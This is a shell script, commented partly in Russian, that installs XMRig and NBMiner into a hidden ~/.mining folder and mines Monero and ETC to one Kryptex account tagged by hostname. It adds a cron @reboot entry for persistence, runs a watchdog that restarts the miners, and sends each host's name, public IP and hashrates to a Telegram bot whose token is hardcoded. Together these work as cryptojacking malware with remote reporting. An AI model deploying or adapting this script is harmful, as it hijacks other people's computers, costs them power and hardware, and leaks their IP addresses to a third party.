#!/bin/sh
set -eu

#################################################
# MINING AGENT — CPU (XMRIG) + GPU (NBMINER)
# TELEGRAM + WATCHDOG + AUTOSTART
#################################################

[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

##### TELEGRAM #####
TG_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TG_CHAT="5336452267"

##### PANEL REPLACED BY TG #####
INTERVAL=30
HOST="$(hostname)"
START_TS="$(date +%s)"
REPORT_20_SENT=0
ZERO_GPU=0
ZERO_CPU=0

##### ACCOUNTS #####
KRIPTEX="krxX3PVQVR"

##### POOLS #####
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

##### PATHS #####
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG"

#################################################
# TELEGRAM
#################################################

tg() {
  curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \
    -d chat_id="$TG_CHAT" \
    --data-urlencode text="$1" >/dev/null 2>&1
}

get_ip() {
  curl -s https://api.ipify.org || echo "unknown"
}

#################################################
# INSTALL
#################################################

install_xmrig() {
  [ -x "$BIN/cpu/xmrig" ] && return
  tg "⚙️ [$HOST] Установка XMRig"
  wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O /tmp/xmr.tgz
  tar -xzf /tmp/xmr.tgz -C "$BIN/cpu" --strip-components=1
  chmod +x "$BIN/cpu/xmrig"
}

install_nbminer() {
  [ -x "$BIN/gpu/nbminer" ] && return
  tg "⚙️ [$HOST] Установка NBMiner (NVIDIA)"
  wget -q https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz -O /tmp/nb.tgz
  tar -xzf /tmp/nb.tgz -C "$BIN/gpu" --strip-components=1
  chmod +x "$BIN/gpu/nbminer"
}

#################################################
# CPU — XMRIG
#################################################

start_cpu() {
  stop_cpu
  nohup "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    >> "$LOG/cpu.log" 2>&1 &
  echo $! > "$RUN/cpu.pid"
}

stop_cpu() {
  [ -f "$RUN/cpu.pid" ] && kill "$(cat "$RUN/cpu.pid")" 2>/dev/null || true
  rm -f "$RUN/cpu.pid"
}

#################################################
# GPU — NBMINER
#################################################

start_gpu() {
  stop_gpu
  nohup "$BIN/gpu/nbminer" \
    -a etchash \
    -o stratum+tcp://$ETC_POOL \
    -u "$KRIPTEX.$HOST" \
    --api 127.0.0.1:22333 \
    >> "$LOG/gpu.log" 2>&1 &
  echo $! > "$RUN/gpu.pid"
}

stop_gpu() {
  [ -f "$RUN/gpu.pid" ] && kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
  rm -f "$RUN/gpu.pid"
}

#################################################
# HASHRATES
#################################################

cpu_hr() {
  curl -s http://127.0.0.1:16000/1/summary \
    | grep -oE '"total":\[[^]]+' \
    | grep -oE '[0-9]+(\.[0-9]+)?' \
    | head -1 || echo 0
}

gpu_hr() {
  curl -s http://127.0.0.1:22333/api/v1/status \
    | grep -oE '"hashrate":\[[^]]+' \
    | grep -oE '[0-9]+' \
    | awk '{sum+=$1} END {printf "%.2f", sum/1000000}' || echo 0
}

#################################################
# AUTOSTART (SAFE)
#################################################

ensure_autostart() {
  crontab -l 2>/dev/null | grep -q min1.sh || \
    (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min1.sh") | crontab -
}

#################################################
# WATCHDOG
#################################################

watchdog() {

  [ -f "$RUN/cpu.pid" ] || { start_cpu; tg "♻️ [$HOST] CPU перезапущен"; }
  [ -f "$RUN/gpu.pid" ] || { start_gpu; tg "♻️ [$HOST] GPU перезапущен"; }

  CPU="$(cpu_hr)"
  GPU="$(gpu_hr)"

  [ "$(printf "%.0f" "$CPU")" -eq 0 ] && ZERO_CPU=$((ZERO_CPU+1)) || ZERO_CPU=0
  [ "$(printf "%.0f" "$GPU")" -eq 0 ] && ZERO_GPU=$((ZERO_GPU+1)) || ZERO_GPU=0

  [ "$ZERO_CPU" -ge 3 ] && { start_cpu; tg "⚠️ [$HOST] XMR хешрейт=0 → рестарт"; ZERO_CPU=0; }
  [ "$ZERO_GPU" -ge 3 ] && { start_gpu; tg "⚠️ [$HOST] ETC хешрейт=0 → рестарт"; ZERO_GPU=0; }

  NOW="$(date +%s)"
  if [ $((NOW - START_TS)) -ge 1200 ] && [ "$REPORT_20_SENT" = "0" ]; then
    REPORT_20_SENT=1
    tg "📊 Авто-отчет майнинга
🖥️ Хост: $HOST
🌐 IP: $(get_ip)
⚡️ ETC: $GPU MH/s
⚡️ XMR: $CPU H/s
⏰ Время: $(date)"
  fi
}

#################################################
# MAIN
#################################################

tg "🚀 [$HOST] Запуск установки майнинга"
install_xmrig
install_nbminer
start_cpu
start_gpu
tg "✅ [$HOST] Майнинг запущен
🌐 IP: $(get_ip)"

while true; do
  watchdog
  sleep "$INTERVAL"
done
